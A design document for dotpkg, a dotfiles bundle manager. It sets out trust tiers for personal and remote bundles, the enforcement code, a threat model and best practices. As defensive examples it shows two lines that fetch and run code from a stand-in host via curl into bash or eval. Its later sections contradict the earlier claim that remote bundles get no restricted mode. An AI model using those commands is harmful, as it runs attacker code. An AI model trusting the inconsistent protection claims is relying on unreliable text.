# dotpkg Bundle Security Model

## Core Principle

**Bundles configure apps, not the system.**

A bundle packages an app or tool plus that app's configuration. Bundles do not configure the operating system, keyboard settings, Finder behavior, wallpaper, or other personal preferences. System configuration belongs in the root bundle (personal settings).

This principle defines what bundles are allowed to do based on where they come from.

---

## Trust Levels

dotpkg distinguishes two trust levels based on bundle source:

### Personal Bundles (Full Trust)

**Sources:**
- Root bundle (repo root — your personal settings)
- Local bundles (`bundles/` in your dotfiles repo)

**Trust basis:** You wrote this code. You own the repository. You control what goes in it.

**Permissions:** Unrestricted
- Full access to all `dotpkg_preset` categories
- All helpers: `dotpkg_hotkey_*`, `dotpkg_wallpaper`, `dotpkg_terminal_import`, `dotpkg_dock` (all subcommands)
- Raw `defaults write` for any domain
- Arbitrary bash execution
- No guards, no restrictions

**Risk model:** Your code, your machine, your responsibility.

### Remote Bundles (Restricted)

**Sources:**
- User sources (`~/.dotpkg/sources` — git repos you explicitly added)
- GitHub shorthand (`user/repo` fetched from the internet)

**Trust basis:** You did not write this code. It came from the internet or a shared repo.

**Permissions:** No code execution
- **defaults.sh is NOT executed** — file ignored if present
- No helpers, no presets, no `defaults write`, no arbitrary bash
- Configure apps via:
  - `stow/` — config files symlinked into app directories
  - `extensions.txt` — editor extensions installed via marketplace
  - `themes/` — theme files copied to app-specific locations
  - `Brewfile` — packages installed via Homebrew

**If remote bundle needs `defaults write`:**
- Bundle README documents required commands
- User reviews and manually adds to their personal `defaults.sh` (root bundle)
- User chooses what to run, no automatic execution

**Risk model:** Zero remote code execution = zero attack surface. Remote bundles can install apps and configure those apps via files, but cannot execute code or reconfigure your system.

---

## What Each Trust Level Can Do

| Operation | Personal | Remote |
|-----------|----------|--------|
| Install apps via Brewfile | ✓ | ✓ |
| Stow config files | ✓ | ✓ |
| Install editor extensions | ✓ | ✓ |
| Copy theme files | ✓ | ✓ |
| Execute defaults.sh | ✓ | ✗ |
| Call any helper (`dotpkg_*`) | ✓ | ✗ |
| Apply system presets (`dotpkg_preset`) | ✓ | ✗ |
| Configure hotkeys (`dotpkg_hotkey_*`) | ✓ | ✗ |
| Modify dock (`dotpkg_dock`) | ✓ | ✗ |
| Set wallpaper (`dotpkg_wallpaper`) | ✓ | ✗ |
| Import terminal theme (`dotpkg_terminal_import`) | ✓ | ✗ |
| Raw `defaults write` | ✓ | ✗ |
| Arbitrary bash | ✓ | ✗ |

---

## Why Remote Bundles Cannot Execute defaults.sh

**The fundamental problem: Bash is Turing-complete**
- Cannot be safely sandboxed without heavy machinery (containers, VMs)
- User would need to audit every line to spot malice (unrealistic for most users)
- Even restricted execution (allowlisting helpers) is bypassable with clever bash
- Example: `"dotpkg_dock"() { curl evil.com | bash; }; dotpkg_dock add X` redefines the helper

**Most app config doesn't need bash anyway**
- 90% of apps use config files: VS Code settings.json, iTerm prefs plist, zsh configs, etc.
- These are handled by `stow/` (symlinked files) — auditable, no code execution
- Editor extensions via `extensions.txt` (marketplace IDs) — declarative, no code
- Theme files via `themes/` (copied files) — static content, no execution

**Apps that need `defaults write` are edge cases**
- Typically personal-preference territory (Terminal theme, accent color, etc.)
- Bundle README can document required commands
- User reviews and manually adds to personal `defaults.sh` (explicit, auditable)
- Slightly less convenient, but dramatically more secure

**Security > convenience**
- A bundle that can't be 100% automated is acceptable
- Manual step for edge cases beats remote code execution risk
- Forces transparency: user sees exactly what system changes they're making

**The alternative (restricted mode) doesn't work**
- Allowlisting specific helpers still allows arbitrary bash between calls
- Domain filtering for `defaults write` is brittle (app name ≠ bundle ID ≠ domain)
- Complexity doesn't eliminate risk, just obscures it
- Users trust "restricted mode" without understanding bypasses exist

---

## Enforcement

**Simple: defaults.sh is not sourced for remote bundles**

```bash
# In install_bundle, before sourcing defaults.sh:
if [[ "$source" == "local" && -f "$bundle_path/defaults.sh" ]]; then
  # Personal bundle - execute normally
  . "$bundle_path/defaults.sh"
elif [[ -f "$bundle_path/defaults.sh" ]]; then
  # Remote bundle - skip execution, notify user
  echo "Note: defaults.sh skipped (remote bundle). See bundle README for manual setup steps." >&2
fi
```

**That's it. No restricted mode, no guards, no allowlisting.**

Remote bundles cannot execute code. If a remote bundle has a `defaults.sh` file, it's ignored. User is notified to check the README for manual setup instructions.

**No enforcement complexity because there's nothing to enforce** — the file isn't sourced, period.

### What Users See

**GitHub shorthand bundle** (`dotpkg add user/repo`):
1. Full preview via `gum` showing `bundle.info`, `Brewfile`, `defaults.sh`, `extensions.txt`, `requires.txt`
2. Explicit confirmation prompt: "Install this bundle? (y/N)"
3. User can audit `defaults.sh` for malicious commands before confirming
4. If installed, runs in restricted mode (helpers blocked, `defaults` neutered)

**Source bundle** (`~/.dotpkg/sources`):
1. User added this repo explicitly (`echo "user/repo" >> ~/.dotpkg/sources`)
2. No preview (assumes prior vetting)
3. Runs in restricted mode (same blocks as GitHub bundles)

**Personal bundle** (root or local):
1. User wrote this code or committed it to their repo
2. No preview, no restrictions
3. Full trust

---

## Threat Model

### What This Protects Against

1. **All code execution from remote bundles** — No bash, no `defaults write`, no helpers. Remote bundles cannot run code.
2. **Accidental system reconfiguration** — Installing "dev-tools" bundle cannot change keyboard repeat, Finder settings, wallpaper, etc.
3. **Destructive workspace changes** — Remote bundle cannot wipe dock, disable hotkeys, or modify system preferences
4. **Opaque system modifications** — All remote bundle config is in auditable files (`stow/`, `extensions.txt`, `themes/`)
5. **Terminal theme command injection** — Not possible; remote bundles can't execute `dotpkg_terminal_import`
6. **Casual AND sophisticated malice** — No code execution = no attack surface via defaults.sh

### What This Does NOT Protect Against

1. **Malicious Brewfile** — Bundle could install a trojanized cask from a tap. Homebrew's trust model applies (verify taps before use).
2. **Malicious stow files** — Bundle could stow a `.zshrc` containing `eval "$(curl evil.com)"`. User should audit stowed configs before install (GitHub preview shows file contents).
3. **Malicious extension IDs** — Bundle could list a malicious VS Code extension. Editor marketplace trust model applies (install extensions from verified publishers).
4. **Supply chain attacks** — Compromised dependency in a bundle's Brewfile. Same risk as any Homebrew usage.

**Philosophy:** Eliminate the code execution attack surface entirely. Config files and package lists are auditable. Code execution is not.

---

## Best Practices

### For Bundle Authors

**Personal bundles (your dotfiles repo):**
- Use presets and helpers freely
- Apply system preferences in root bundle `defaults.sh`
- Tool bundles can use personal-only helpers (you control the code)

**Shared/public bundles (intended for others):**
- Use `stow/` for app config files, not `defaults write`
- Use `extensions.txt` for editor extensions
- Use `dotpkg_dock add` to suggest apps (don't assume dock layout)
- Document what apps you install and what config you apply
- Keep `defaults.sh` minimal and auditable

### For Bundle Users

**Before installing a GitHub bundle:**
1. Read the full preview, especially `defaults.sh`
2. Look for `curl`, `rm`, `defaults write`, or anything suspicious
3. When in doubt, clone the repo and audit offline before adding to sources
4. Only install from authors you trust

**Before adding a source repo:**
1. Clone it locally and audit `defaults.sh` in every bundle
2. Check the author's history (GitHub profile, other repos)
3. Adding a source = full trust (no preview on install)

**For your own bundles:**
- Keep personal settings (keyboard, wallpaper, hotkeys) in root bundle only
- Tool bundles should configure the tool, not the system
- Review your own `defaults.sh` files — complexity = risk

---

## Summary

dotpkg's security model is **trust-tiered and transparency-based**:
- Personal code = full access (you own the risk)
- Remote code = restricted access (limited blast radius) + preview (auditable before install)
- Enforcement = programmatic blocks for common attacks + convention for sophisticated attacks
- Philosophy = make malice hard and auditable, accept that determined attackers can bypass if users ignore warnings

The goal is not perfect security (impossible), but **reasonable defaults that protect against accidents and casual malice** while keeping the system simple and auditable.
